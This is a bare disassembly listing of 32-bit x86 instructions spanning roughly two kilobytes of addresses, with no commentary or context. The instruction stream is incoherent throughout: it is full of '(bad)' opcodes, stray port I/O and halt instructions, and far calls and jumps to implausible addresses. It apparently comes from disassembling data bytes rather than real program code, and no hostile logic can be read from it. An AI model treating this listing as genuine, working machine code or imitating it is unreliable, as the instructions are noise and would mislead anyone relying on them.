  4117c7:	arpl   bp,ax
  4117c9:	xor    bh,bh
  4117cb:	jae    0x411849
  4117cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ce:	sub    bl,ch
  4117d0:	ja     0x411769
  4117d2:	and    al,0x89
  4117d4:	dec    edi
  4117d5:	jns    0x4117bb
  4117d7:	jle    0x41181a
  4117d9:	std    
  4117da:	call   0x8af97725
  4117df:	loop   0x4117f4
  4117e1:	mov    ds:0xf9313f81,eax
  4117e6:	mov    WORD PTR [edx+0x847abe],?
  4117ec:	sub    eax,0x6980ada1
  4117f1:	adc    bl,0x1a
  4117f4:	fidivr WORD PTR [edi+0x3d1fe99]
  4117fa:	(bad)  
  4117fb:	std    
  4117fc:	pop    esp
  4117fd:	cmp    eax,0xc4c956ec
  411802:	cmp    edi,ecx
  411804:	cld    
  411805:	lea    edx,[esi+0x21]
  411808:	mov    eax,0xe4ee2263
  41180d:	sbb    al,0x9b
  41180f:	xchg   ebx,eax
  411810:	mov    BYTE PTR [edx+eiz*2+0x45],ah
  411814:	stc    
  411815:	repz fild QWORD PTR [eax-0x1f]
  411819:	mov    ds:0x7d8444b2,al
  41181e:	(bad)  
  41181f:	xchg   esp,eax
  411820:	stos   BYTE PTR es:[edi],al
  411821:	inc    esi
  411822:	add    bh,ch
  411824:	inc    edx
  411825:	xchg   ebp,edx
  411827:	mov    ebp,0xe41595fa
  41182c:	into   
  41182d:	imul   edx,DWORD PTR [esi+0x2],0x1b9d495e
  411834:	in     al,dx
  411835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411836:	je     0x4117f0
  411838:	mov    esp,0x284604b2
  41183d:	dec    eax
  41183e:	mov    gs,esp
  411840:	cdq    
  411841:	xchg   esp,eax
  411842:	cmp    eax,0x6a73e8da
  411847:	add    eax,0x8a0622ef
  41184c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41184d:	jg     0x4118b3
  41184f:	ins    DWORD PTR es:[edi],dx
  411850:	mov    eax,ds:0x90ba8e16
  411855:	ds sbb al,0xc6
  411858:	add    esi,DWORD PTR [edx-0x379399bc]
  41185e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41185f:	push   0x67855b83
  411864:	lock imul edi,edi,0x55
  411868:	in     al,0x27
  41186a:	mov    ebx,0x9e2d213f
  41186f:	adc    dl,BYTE PTR [edx]
  411871:	mov    bh,0x12
  411873:	jmp    0x4118c7
  411875:	in     al,dx
  411876:	push   eax
  411877:	out    0x58,al
  411879:	dec    eax
  41187a:	loopne 0x411823
  41187c:	or     BYTE PTR [edx],bh
  41187e:	test   ecx,esi
  411880:	repnz mov bl,0x96
  411883:	lods   al,BYTE PTR ds:[esi]
  411884:	std    
  411885:	ror    al,cl
  411887:	inc    ecx
  411888:	mov    ah,0xe
  41188a:	pop    eax
  41188b:	popf   
  41188c:	pop    ds
  41188d:	add    esi,DWORD PTR [ebx-0x47]
  411890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411891:	xchg   ebp,eax
  411892:	add    al,0x68
  411894:	data16 aad 0x4b
  411897:	mov    esp,0xe7b37928
  41189c:	push   0x34
  41189e:	mov    ds:0xfdf9dc79,eax
  4118a3:	jg     0x411896
  4118a5:	stos   DWORD PTR es:[edi],eax
  4118a6:	sub    ecx,ebp
  4118a8:	scas   al,BYTE PTR es:[edi]
  4118a9:	imul   esi,DWORD PTR [ecx+0x5c],0xffffffb6
  4118ad:	and    ebx,DWORD PTR [edi]
  4118af:	mov    ebp,0x6bcd8781
  4118b4:	into   
  4118b5:	jbe    0x4118a8
  4118b7:	in     al,dx
  4118b8:	pop    eax
  4118b9:	xor    eax,edi
  4118bb:	sbb    BYTE PTR [esi+0x16c125ff],bh
  4118c1:	stc    
  4118c2:	scas   al,BYTE PTR es:[edi]
  4118c3:	inc    ebx
  4118c4:	lahf   
  4118c5:	sbb    BYTE PTR [edi+eiz*2],bl
  4118c8:	xchg   esp,eax
  4118c9:	rcl    DWORD PTR [bp+di-0x22],1
  4118cd:	push   edi
  4118ce:	push   esp
  4118cf:	fdivr  QWORD PTR [ebx-0x1e1cfd54]
  4118d5:	stos   BYTE PTR es:[edi],al
  4118d6:	and    al,0x56
  4118d8:	xlat   BYTE PTR cs:[ebx]
  4118da:	push   cs
  4118db:	test   bh,al
  4118dd:	push   es
  4118de:	js     0x411943
  4118e0:	push   cs
  4118e1:	iret   
  4118e2:	loop   0x41195a
  4118e4:	push   ebp
  4118e5:	cmp    DWORD PTR ds:0x65a00c75,esp
  4118eb:	cmc    
  4118ec:	pop    eax
  4118ed:	das    
  4118ee:	mov    bl,0xb0
  4118f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f1:	retf   0x1dd4
  4118f4:	fdiv   st,st(0)
  4118f6:	pop    esi
  4118f7:	icebp  
  4118f8:	jcxz   0x411962
  4118fb:	hlt    
  4118fc:	dec    edi
  4118fd:	jno    0x4118e4
  4118ff:	pop    edi
  411900:	rol    DWORD PTR [eax],cl
  411902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411903:	hlt    
  411904:	out    dx,al
  411905:	and    al,0xad
  411907:	mov    bh,0x1
  411909:	fdiv   QWORD PTR [ebx+0x2f]
  41190c:	ins    DWORD PTR es:[edi],dx
  41190d:	push   eax
  41190e:	pop    ebx
  41190f:	adc    eax,DWORD PTR [edi-0x77]
  411912:	int    0x73
  411914:	mov    esp,0xc3f8543c
  411919:	and    al,0x22
  41191b:	std    
  41191c:	xchg   edx,eax
  41191d:	and    cl,al
  41191f:	cmp    DWORD PTR [eax],ebp
  411921:	adc    BYTE PTR [eax-0x3c],dl
  411924:	and    bl,al
  411926:	jecxz  0x4118ac
  411928:	sub    eax,0x56d72f68
  41192d:	and    al,0x1d
  41192f:	dec    edi
  411930:	adc    DWORD PTR [ebx+ebp*1+0x37],esp
  411934:	fsub   DWORD PTR [edx+edx*8+0x6ba5c83f]
  41193b:	or     BYTE PTR [esi+0x37cd67f3],cl
  411941:	and    DWORD PTR [edx+0x72],0xdb5b308c
  411948:	pop    ebx
  411949:	bound  edx,QWORD PTR [ecx]
  41194b:	test   BYTE PTR [edx+0x3d659430],cl
  411951:	pop    ebp
  411952:	add    BYTE PTR [ebp-0x222ecfe0],al
  411958:	rcr    DWORD PTR [edi+0x13],1
  41195b:	cmp    al,cl
  41195d:	add    BYTE PTR [edx],al
  41195f:	sbb    al,0x16
  411961:	push   cs
  411962:	mov    BYTE PTR [edi+0x2b53645f],ah
  411968:	pop    esi
  411969:	loope  0x411942
  41196b:	fistp  WORD PTR [ecx-0x43]
  41196e:	rcl    BYTE PTR [ebp+0x7e],0x79
  411972:	or     al,0xcf
  411974:	call   0x8941:0xcb29d322
  41197b:	or     DWORD PTR [ecx],ecx
  41197d:	sbb    bl,ah
  41197f:	jnp    0x41190e
  411981:	sti    
  411982:	ret    
  411983:	or     edx,ecx
  411985:	daa    
  411986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411987:	aad    0xc3
  411989:	cdq    
  41198a:	adc    al,0x3a
  41198c:	jg     0x4119e8
  41198e:	sub    al,0xff
  411990:	mov    eax,ds:0x57a54bab
  411995:	adc    bh,BYTE PTR [ecx+0x7f]
  411998:	hlt    
  411999:	and    ebp,eax
  41199b:	shl    DWORD PTR [esi-0x9],0xdc
  41199f:	pop    es
  4119a0:	shr    esp,cl
  4119a2:	mov    ds:0xf4e4c67d,al
  4119a7:	sub    eax,0xb0cbdc97
  4119ac:	ds or  ch,dl
  4119af:	pop    eax
  4119b0:	test   BYTE PTR [edi],dh
  4119b2:	dec    eax
  4119b3:	bound  edx,QWORD PTR [ebx+0x171344cb]
  4119b9:	in     eax,0x2d
  4119bb:	cmp    DWORD PTR [esi+0x2b861999],0xffffffe7
  4119c2:	mov    dh,0x76
  4119c4:	mov    al,0x97
  4119c6:	add    esi,DWORD PTR [ebx+edi*8]
  4119c9:	retf   0x810e
  4119cc:	jmp    0x41196f
  4119ce:	(bad)  
  4119cf:	loope  0x4119e1
  4119d1:	xchg   ebp,eax
  4119d2:	je     0x4119b5
  4119d4:	and    BYTE PTR [ecx-0x16],al
  4119d7:	hlt    
  4119d8:	adc    edi,esp
  4119da:	inc    esp
  4119db:	fsubr  QWORD PTR [ecx+0x4d079cc3]
  4119e1:	sub    al,0x21
  4119e3:	and    esp,edx
  4119e5:	into   
  4119e6:	push   ecx
  4119e7:	cwde   
  4119e8:	adc    edi,DWORD PTR [ebp+0x2f]
  4119eb:	xchg   edi,eax
  4119ec:	mov    bl,0xe
  4119ee:	push   ss
  4119ef:	sub    bl,0x4b
  4119f2:	xlat   BYTE PTR ds:[ebx]
  4119f4:	mov    ebx,0x108676f0
  4119f9:	jne    0x4119e4
  4119fb:	cwde   
  4119fc:	outs   dx,BYTE PTR ds:[esi]
  4119fd:	sbb    al,0x98
  4119ff:	inc    ebp
  411a00:	daa    
  411a01:	adc    al,0x98
  411a03:	xor    edx,DWORD PTR [edi-0x31]
  411a06:	jmp    0xb075ee92
  411a0b:	(bad)  
  411a0c:	ins    DWORD PTR es:[edi],dx
  411a0d:	jne    0x411a63
  411a0f:	and    eax,0xdf8352c5
  411a14:	mov    dh,0x56
  411a16:	sub    al,0xf6
  411a18:	or     eax,0xcc3df142
  411a1d:	sub    DWORD PTR [esi+0x4b6882ac],edx
  411a23:	adc    dh,bh
  411a25:	jmp    0x4119be
  411a27:	mov    bh,0xf8
  411a29:	jmp    0x411a00
  411a2b:	dec    ecx
  411a2c:	sub    DWORD PTR [edx],eax
  411a2e:	cs enter 0x60a,0xc6
  411a33:	jg     0x4119bd
  411a35:	imul   edi,DWORD PTR [eax-0x2d],0x56c891e5
  411a3c:	xlat   BYTE PTR ds:[ebx]
  411a3d:	out    0xf5,eax
  411a3f:	mov    ds:0xa070ee24,al
  411a44:	test   al,0x77
  411a46:	jle    0x411a6e
  411a48:	mul    ebx
  411a4a:	xchg   edi,eax
  411a4b:	adc    ecx,DWORD PTR [ecx-0x52e57876]
  411a51:	dec    ebx
  411a52:	sub    BYTE PTR [esi+0x351a0c62],dl
  411a58:	fisttp QWORD PTR [edi+0x119ea0ba]
  411a5e:	jmp    0x411ac7
  411a60:	scas   al,BYTE PTR es:[edi]
  411a61:	test   al,0x25
  411a63:	pop    ds
  411a64:	es xchg ecx,eax
  411a66:	pop    esp
  411a67:	mov    ebp,0xa03242b5
  411a6c:	add    DWORD PTR [esp+ecx*8],ebx
  411a6f:	retf   0x6807
  411a72:	sahf   
  411a73:	pop    ebp
  411a74:	mov    cl,0xde
  411a76:	adc    bh,BYTE PTR gs:[eax+0xe]
  411a7a:	out    0xc8,eax
  411a7c:	sub    al,0x63
  411a7e:	(bad)  
  411a7f:	xchg   ebp,eax
  411a80:	lods   al,BYTE PTR ds:[esi]
  411a81:	jl     0x411a90
  411a83:	push   edx
  411a84:	xchg   edx,eax
  411a85:	add    edi,DWORD PTR [ebx+0x4b2be924]
  411a8b:	adc    eax,0x82a1ede5
  411a90:	out    dx,al
  411a91:	pushf  
  411a92:	push   ds
  411a93:	pop    esp
  411a94:	out    0x4d,al
  411a96:	or     DWORD PTR [ecx+ecx*2+0x6e937fd4],0x6e8c4447
  411aa1:	jecxz  0x411a2d
  411aa3:	cmp    DWORD PTR [ecx],0xeec44ddc
  411aa9:	jbe    0x411a7e
  411aab:	cld    
  411aac:	(bad)  
  411aad:	in     eax,0x4d
  411aaf:	add    DWORD PTR [edi+esi*4+0x93fb2e5],0xffffff86
  411ab7:	pop    esi
  411ab8:	fwait
  411ab9:	dec    ecx
  411aba:	jae    0x411af9
  411abc:	mov    WORD PTR [ebp+0x46b1e877],?
  411ac2:	mov    bh,0x72
  411ac4:	xor    al,0x6b
  411ac7:	retf   0xc28b
  411aca:	jnp    0x411abd
  411acc:	jl     0x411af7
  411ace:	jge    0x411a5d
  411ad0:	clc    
  411ad1:	fs into 
  411ad3:	mov    fs,esi
  411ad5:	ret    
  411ad6:	in     al,0x26
  411ad8:	mov    dl,BYTE PTR [ebx+eiz*1]
  411adb:	adc    al,0x1c
  411add:	cmp    eax,0x8554c5b2
  411ae2:	(bad)  
  411ae3:	adc    al,0xf9
  411ae5:	ds stc 
  411ae7:	dec    ecx
  411ae8:	cs jge 0x411b16
  411aeb:	pop    ecx
  411aec:	call   0x345c:0x1a73f7f1
  411af3:	jecxz  0x411aa1
  411af5:	out    dx,al
  411af6:	mov    ebp,gs
  411af8:	mov    ch,0xfb
  411afa:	outs   dx,DWORD PTR ds:[esi]
  411afb:	push   es
  411afc:	dec    eax
  411afd:	jae    0x411a97
  411aff:	cmp    dl,al
  411b01:	int    0x4f
  411b03:	jmp    0x411aff
  411b05:	mov    ah,BYTE PTR [eax+ebp*2]
  411b08:	mov    esi,0xaf39aa5a
  411b0d:	mov    ?,WORD PTR [ebp+0x1b]
  411b10:	xchg   edi,eax
  411b11:	dec    edi
  411b12:	add    DWORD PTR [esi-0x39cd4bd5],edi
  411b18:	fisubr DWORD PTR [ebp-0xa]
  411b1b:	out    0x40,al
  411b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b1e:	ja     0x411b31
  411b20:	and    BYTE PTR [edx+0x24ec442d],dh
  411b26:	jo     0x411ad1
  411b28:	loopne 0x411b0a
  411b2a:	stc    
  411b2b:	(bad)  
  411b2c:	loopne 0x411b01
  411b2e:	(bad)  
  411b2f:	repz test bl,0x5
  411b33:	push   esp
  411b34:	mov    ebp,0x8af604ab
  411b39:	btc    DWORD PTR ss:[ecx],ebp
  411b3d:	js     0x411ad4
  411b3f:	paddb  mm1,QWORD PTR [esp+ebp*1]
  411b43:	push   ebx
  411b44:	mov    BYTE PTR [ebp-0x12f2b9fb],bh
  411b4a:	push   eax
  411b4b:	call   0xa5d0b719
  411b50:	fwait
  411b51:	push   es
  411b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b53:	mov    edi,0xd77c704f
  411b58:	mov    ecx,0xbcdbb3e8
  411b5d:	mov    WORD PTR [ebp+esi*4+0x5f9eb17e],?
  411b64:	test   eax,0x3a6f2603
  411b69:	ins    DWORD PTR es:[edi],dx
  411b6a:	pop    esp
  411b6b:	je     0x411b7c
  411b6d:	or     al,0x25
  411b6f:	inc    ebp
  411b70:	mov    ecx,0x9108ff56
  411b75:	lock sub DWORD PTR [eax],edi
  411b78:	retf   
  411b79:	mov    ebx,eax
  411b7b:	xor    edi,DWORD PTR [esi+eiz*2+0x2b]
  411b7f:	push   cs
  411b80:	idiv   BYTE PTR ds:0x802da07
  411b86:	sub    al,0x7c
  411b88:	mov    edx,ds
  411b8a:	mov    eax,0x1a2f4121
  411b8f:	out    dx,eax
  411b90:	inc    eax
  411b91:	mov    WORD PTR [ecx-0x2e009123],ds
  411b97:	adc    dl,dh
  411b99:	shl    DWORD PTR [ebx-0x4a2bfc92],cl
  411b9f:	push   0x5e
  411ba1:	add    eax,0x7e944467
  411ba6:	sub    BYTE PTR [esi],0xbb
  411ba9:	dec    esi
  411baa:	push   DWORD PTR [edx+edi*2]
  411bad:	daa    
  411bae:	push   ebp
  411baf:	lea    ecx,[eax-0x2842da9]
  411bb5:	pop    eax
  411bb6:	jecxz  0x411bde
  411bb8:	aaa    
  411bb9:	data16 fldcw WORD PTR [si-0x49]
  411bbe:	xchg   ebp,eax
  411bbf:	sbb    DWORD PTR ds:0x8883ec38,ecx
  411bc5:	cmp    BYTE PTR [eax+ebp*2+0x36],bh
  411bc9:	jp     0x411c17
  411bcb:	fld    TBYTE PTR [ebx-0x26]
  411bce:	dec    eax
  411bcf:	jnp    0x411be5
  411bd1:	aam    0xed
  411bd3:	outs   dx,DWORD PTR ds:[esi]
  411bd4:	scas   eax,DWORD PTR es:[edi]
  411bd5:	cmp    DWORD PTR [ebp+0x6c],edi
  411bd8:	adc    eax,0x5628b074
  411bdd:	and    DWORD PTR [esp+esi*1-0x48d075e1],ebp
  411be4:	out    0x9d,al
  411be6:	mov    ah,0x6d
  411be8:	xchg   edi,eax
  411be9:	push   0xfffffff7
  411beb:	and    DWORD PTR [ecx-0xd],ebx
  411bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bef:	cvtps2pd xmm0,QWORD PTR [edx]
  411bf2:	lods   eax,DWORD PTR ds:[esi]
  411bf3:	jb     0x411bba
  411bf5:	imul   ebp,ebp,0x5c9b2f99
  411bfb:	cmp    bl,BYTE PTR [ebp+ebp*4+0xe]
  411bff:	mov    dh,0x56
  411c01:	xor    DWORD PTR [ebx],edi
  411c03:	gs jecxz 0x411b9f
  411c06:	mov    esp,0x52108b5
  411c0b:	out    dx,al
  411c0c:	mov    ebx,DWORD PTR [ebp+0x6]
  411c0f:	daa    
  411c10:	dec    esi
  411c11:	dec    edx
  411c12:	aas    
  411c13:	ds icebp 
  411c15:	sbb    bl,BYTE PTR [edx+0x49]
  411c18:	or     al,0xb1
  411c1a:	(bad)  
  411c1b:	cld    
  411c1c:	sub    DWORD PTR [esi],ebx
  411c1e:	pop    edi
  411c1f:	test   eax,0x3b75ae92
  411c24:	sar    BYTE PTR [edi+eax*2+0x73],1
  411c28:	or     ebx,ebx
  411c2a:	aam    0x9d
  411c2c:	cwde   
  411c2d:	sub    BYTE PTR [esp+edi*2-0x747de0f1],cl
  411c34:	mov    ah,0x56
  411c36:	sbb    bl,BYTE PTR [eax+0x77df0173]
  411c3c:	fisub  DWORD PTR [edi+ecx*1]
  411c3f:	sti    
  411c40:	inc    ebx
  411c41:	sub    al,0xbd
  411c43:	(bad)  
  411c44:	mov    bl,0x87
  411c46:	xor    bl,BYTE PTR [ebx]
  411c48:	out    0x1,eax
  411c4a:	les    ebp,FWORD PTR [ebx-0xb]
  411c4d:	ja     0x411c3c
  411c4f:	call   0x9ee5f30d
  411c54:	(bad)  
  411c55:	push   cs
  411c56:	fwait
  411c57:	cmp    eax,0xe8a61aa6
  411c5c:	push   0xa5589afe
  411c61:	sti    
  411c62:	lock enter 0x62d5,0x53
  411c67:	push   ecx
  411c68:	mov    cl,BYTE PTR [ebx+ecx*4]
  411c6b:	mov    ch,0x6d
  411c6d:	mov    ah,0x64
  411c6f:	lea    eax,[ebx]
  411c71:	xor    ecx,DWORD PTR [ebx+ebp*1-0x7b]
  411c75:	mov    edx,0xb83be9ac
  411c7a:	js     0x411c04
  411c7c:	imul   BYTE PTR [ebp-0xd6e32f5]
  411c82:	add    al,BYTE PTR [eax+0x72d13eea]
  411c88:	sbb    BYTE PTR [ebp+0x6c],al
  411c8b:	cli    
  411c8c:	mov    bh,0x2e
  411c8e:	in     al,dx
  411c8f:	xchg   DWORD PTR [ecx-0x49f3b26],ebp
  411c95:	scas   eax,DWORD PTR es:[edi]
  411c96:	dec    BYTE PTR [eax+eiz*4]
  411c99:	mov    edx,0x28d69bb8
  411c9e:	(bad)  
  411c9f:	dec    edi
  411ca0:	inc    ebx
  411ca1:	and    al,0x5e
  411ca3:	mov    ecx,0xeddf8e23
  411ca8:	push   edx
  411ca9:	ins    BYTE PTR es:[edi],dx
  411caa:	test   al,0x7e
  411cac:	or     ch,BYTE PTR [esi-0x66]
  411caf:	jmp    0x411ce2
  411cb1:	mov    ecx,0x858826e5
  411cb6:	pop    esi
  411cb7:	std    
  411cb8:	ds aas 
  411cba:	(bad)  
  411cbb:	xor    edi,DWORD PTR [ecx+0xd]
  411cbe:	xchg   ebp,eax
  411cbf:	outs   dx,DWORD PTR ds:[esi]
  411cc0:	ss push ebp
  411cc2:	pop    esi
  411cc3:	shl    BYTE PTR [esi],1
  411cc5:	lock add al,0x28
  411cc8:	push   cs
  411cc9:	fild   DWORD PTR [ebp-0x497b1772]
  411ccf:	mov    esi,0x1137be17
  411cd4:	or     edx,DWORD PTR [ebp-0x63]
  411cd7:	and    edi,DWORD PTR [ecx-0x3a1b9a93]
  411cdd:	std    
  411cde:	mov    bh,0x95
  411ce0:	(bad)  
  411ce1:	mov    ecx,0xcaa10bdf
  411ce6:	mov    al,0xc2
  411ce8:	jb     0x411d50
  411cea:	ret    
  411ceb:	or     ecx,ebp
  411ced:	and    ch,al
  411cef:	sar    DWORD PTR [edi],0x33
  411cf2:	mov    ch,0x86
  411cf4:	xor    DWORD PTR [ebx-0x51],edi
  411cf7:	test   BYTE PTR [ebp-0x5d83fd22],al
  411cfd:	stos   BYTE PTR es:[edi],al
  411cfe:	leave  
  411cff:	fistp  QWORD PTR [ecx+0x68620531]
  411d05:	xor    ebx,DWORD PTR ds:0xd216c9be
  411d0b:	push   ds
  411d0c:	rol    bh,1
  411d0e:	xchg   ebp,eax
  411d0f:	stos   DWORD PTR es:[edi],eax
  411d10:	push   ebp
  411d11:	test   DWORD PTR [edx-0x120dcd15],eax
  411d17:	sbb    ebx,DWORD PTR [edx+eiz*4]
  411d1a:	jnp    0x411ca4
  411d1c:	push   ds
  411d1d:	ret    
  411d1e:	or     DWORD PTR [edi+0x7d],0xffffffab
  411d22:	push   es
  411d23:	pmulhw mm7,mm2
  411d26:	arpl   WORD PTR [eax-0x74],dx
  411d29:	jb     0x411ccb
  411d2b:	pop    ds
  411d2c:	push   esp
  411d2d:	add    edx,DWORD PTR [ebp+0x1e3cf7ed]
  411d33:	call   0xbdf0:0x382875cb
  411d3a:	push   edi
  411d3b:	(bad)  
  411d3c:	sahf   
  411d3d:	mov    bh,0x4c
  411d3f:	ins    DWORD PTR es:[edi],dx
  411d40:	xchg   ecx,eax
  411d41:	pusha  
  411d42:	jbe    0x411d99
  411d44:	pop    ss
  411d45:	cmp    eax,0xe19353bd
  411d4a:	aad    0xbc
  411d4c:	fsin   
  411d4e:	fs imul ecx,edx,0x1a
  411d52:	sbb    al,dl
  411d54:	retf   0x7e28
  411d57:	xor    bl,bh
  411d59:	xor    DWORD PTR [edx+0x63639787],0x86ae33ff
  411d63:	lods   eax,DWORD PTR ds:[esi]
  411d64:	or     DWORD PTR [edi-0x7dbdd2f2],edx
  411d6a:	mov    bl,0x75
  411d6c:	add    dh,BYTE PTR [edx+0x670cef5]
  411d72:	adc    al,0xeb
  411d74:	jle    0x411dea
  411d76:	mov    dh,0x4
  411d78:	jg     0x411d97
  411d7a:	adc    eax,0x369919ec
  411d7f:	xchg   ebp,esi
  411d81:	or     BYTE PTR [eax],dl
  411d83:	add    bh,BYTE PTR [ebp*4-0x671b268e]
  411d8a:	neg    eax
  411d8c:	push   0x969b0fe8
  411d91:	adc    BYTE PTR [edi],bl
  411d93:	mov    edx,0xc1d36462
  411d98:	(bad)  
  411d99:	(bad)  
  411d9a:	mov    ds:0xf1dd3faa,al
  411d9f:	(bad)  [esi+0x3a4bc197]
  411da5:	jns    0x411df4
  411da7:	lds    esp,FWORD PTR [ecx-0x6daeeaad]
  411dad:	rcl    BYTE PTR cs:[edx+0x67],1
  411db1:	push   esi
  411db2:	jne    0x411d59
  411db4:	test   al,0xf7
  411db6:	mov    gs,ebp
  411db8:	in     eax,dx
  411db9:	dec    ebx
  411dba:	outs   dx,DWORD PTR ds:[esi]
  411dbb:	push   eax
  411dbc:	jl     0x411d53
  411dbe:	js     0x411d7d
  411dc0:	(bad)  
  411dc2:	push   0x18
  411dc4:	or     bl,al
  411dc6:	xchg   esi,eax
  411dc7:	cs movd mm6,edi
  411dcb:	push   ds
  411dcc:	sub    DWORD PTR [edx+0x3e],0x13af7272
  411dd3:	data16 xlat BYTE PTR ds:[ebx]
  411dd5:	rcl    bh,cl
  411dd7:	(bad)  
  411dd8:	in     al,dx
  411dd9:	fdivr  QWORD PTR [esi]
  411ddb:	stos   DWORD PTR es:[edi],eax
  411ddc:	pop    esi
  411ddd:	mov    ebp,0x17b427d2
  411de2:	test   bl,dh
  411de4:	mov    ah,0x9f
  411de6:	mov    esi,DWORD PTR [eax-0x486780ad]
  411dec:	in     al,0x65
  411dee:	idiv   ecx
  411df0:	ss mov al,0x50
  411df3:	imul   edi,DWORD PTR [eax-0x768794f3],0xffffff85
  411dfa:	xchg   edi,eax
  411dfb:	(bad)  
  411dfc:	(bad)  
  411dfd:	ins    BYTE PTR es:[edi],dx
  411dfe:	mov    edx,0xc281f1ef
  411e03:	lods   eax,DWORD PTR ds:[esi]
  411e04:	ror    DWORD PTR ds:[edx],0xa0
  411e08:	popf   
  411e09:	dec    ebx
  411e0a:	cdq    
  411e0b:	fdivr  DWORD PTR ds:[ebp+edx*4-0x391d7606]
  411e13:	inc    edi
  411e14:	push   ecx
  411e15:	inc    esi
  411e16:	xlat   BYTE PTR ds:[ebx]
  411e17:	push   esp
  411e18:	mov    ebx,0x425c9bbb
  411e1d:	adc    DWORD PTR [edx+0x5fa8a280],esp
  411e23:	shr    BYTE PTR [eax],1
  411e25:	jecxz  0x411e66
  411e27:	adc    BYTE PTR [ebp-0x4776e814],0x2e
  411e2e:	cmp    al,0x8d
  411e30:	ror    DWORD PTR [edx],cl
  411e32:	mov    eax,ds:0x2f845a29
  411e37:	jmp    0x9d59553a
  411e3c:	lods   eax,DWORD PTR ds:[esi]
  411e3d:	arpl   WORD PTR [edx],bx
  411e3f:	push   0xe2229344
  411e44:	adc    esi,esp
  411e46:	mov    al,ds:0x7b87d58b
  411e4b:	and    DWORD PTR [eax+0x5f2cd22c],0x8e6d9db8
  411e55:	dec    esp
  411e56:	call   0xb309d648
  411e5b:	es or  al,0x24
  411e5e:	icebp  
  411e5f:	mov    dh,BYTE PTR [edi]
  411e61:	adc    esp,DWORD PTR [esi+0x7bc8ed1]
  411e67:	inc    ecx
  411e68:	fisub  WORD PTR ss:[esi+0x22]
  411e6c:	outs   dx,BYTE PTR ds:[esi]
  411e6d:	jle    0x411edf
  411e6f:	cmp    eax,0xab18949b
  411e74:	cli    
  411e75:	lods   al,BYTE PTR ds:[esi]
  411e77:	pushf  
  411e78:	mov    dl,BYTE PTR [esi-0x4b]
  411e7b:	mov    ebp,0x70286f7f
  411e80:	mov    BYTE PTR ds:0x66bdc778,dl
  411e86:	jo     0x411ef4
  411e88:	jmp    0x7f632851
  411e8d:	jbe    0x411f05
  411e8f:	popf   
  411e90:	popf   
  411e91:	scas   eax,DWORD PTR es:[edi]
  411e92:	fimul  WORD PTR [esi-0x6]
  411e95:	stos   DWORD PTR es:[edi],eax
  411e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e97:	dec    ecx
  411e98:	outs   dx,DWORD PTR ds:[esi]
  411e99:	dec    edi
  411e9a:	in     al,0xd5
  411e9c:	xchg   ebx,eax
  411e9d:	push   ds
  411e9e:	xchg   esp,eax
  411e9f:	sbb    BYTE PTR [eax+0x26ea157f],ch
  411ea5:	pop    eax
  411ea6:	(bad)  
  411ea7:	jl     0x411ee7
  411ea9:	dec    edx
  411eaa:	xchg   esp,eax
  411eab:	arpl   WORD PTR [ecx+ebx*4+0x7b],bx
  411eaf:	adc    al,0xb8
  411eb1:	jns    0x411e81
  411eb3:	ds or  eax,0x46fb89d7
  411eb9:	sub    DWORD PTR [edx-0x1c634b6a],eax
  411ebf:	and    al,0xe6
  411ec1:	pop    edi
  411ec2:	dec    esi
  411ec3:	mov    ah,0x4
  411ec5:	rol    DWORD PTR [edx-0x71],0x95
  411ec9:	pop    ebp
  411eca:	popf   
  411ecb:	int3   
  411ecc:	stos   BYTE PTR es:[edi],al
  411ecd:	js     0x411edb
  411ecf:	and    ah,bh
  411ed1:	sti    
  411ed2:	clc    
  411ed3:	xchg   ebp,eax
  411ed4:	push   0x46
  411ed6:	pop    eax
  411ed7:	aas    
  411ed8:	cwde   
  411ed9:	xchg   ebp,eax
  411eda:	cld    
  411edb:	jl     0x411f10
  411edd:	out    dx,al
  411ede:	and    ah,BYTE PTR [ecx]
  411ee0:	jae    0x411ed8
  411ee2:	cdq    
  411ee3:	xor    eax,0xdf72e3cb
  411ee8:	cwde   
  411ee9:	dec    ebx
  411eea:	mov    esi,0x65dc4604
  411eef:	mov    eax,ds:0x4c71e1b2
  411ef4:	fwait
  411ef5:	aas    
  411ef6:	xor    edx,DWORD PTR [ecx+0x18]
  411ef9:	jg     0x411e7d
  411efb:	call   0xfddf273d
  411f00:	dec    ebp
  411f01:	scas   al,BYTE PTR es:[edi]
  411f02:	push   es
  411f03:	ins    DWORD PTR es:[edi],dx
  411f04:	push   ds
  411f05:	add    dh,BYTE PTR [edx-0x5d8fec1a]
  411f0b:	jge    0x411f06
  411f0d:	ins    DWORD PTR es:[edi],dx
  411f0e:	cmp    eax,DWORD PTR [ecx-0x63]
  411f11:	sub    eax,0x9c845dab
  411f16:	icebp  
  411f17:	mov    ds:0xe6806107,al
  411f1c:	inc    eax
  411f1d:	add    eax,0xa5c8521e
  411f22:	repnz add DWORD PTR [edx+0x26],ebx
  411f26:	pop    ecx
  411f27:	sbb    eax,0x5bd8aa3f
  411f2c:	push   ss
  411f2d:	fucomi st,st(3)
  411f2f:	ret    0x11a7
  411f32:	push   esi
  411f33:	jbe    0x411ecc
  411f35:	mov    ds:0xa9e7efc9,eax
  411f3a:	fadd   DWORD PTR [ebx-0x23]
  411f3d:	div    BYTE PTR [ebx-0x1f6f70d7]
  411f43:	xchg   BYTE PTR [ecx-0x655e0088],dh
  411f49:	adc    eax,0xb0dc50cf
  411f4e:	xchg   ecx,eax
  411f4f:	inc    esi
  411f50:	push   ds
  411f51:	out    0x6c,al
  411f53:	repnz cmp bl,BYTE PTR gs:[esi+0x364081d]
  411f5b:	stos   BYTE PTR es:[edi],al
  411f5c:	add    DWORD PTR [esi-0x7b54dd1f],esp
  411f62:	loopne 0x411fca
  411f64:	aaa    
  411f65:	pop    esi
  411f66:	dec    ebp
  411f67:	inc    ebp
  411f68:	pop    ecx
  411f69:	rcr    BYTE PTR gs:[esi+0x27d98b82],cl
  411f70:	popa   
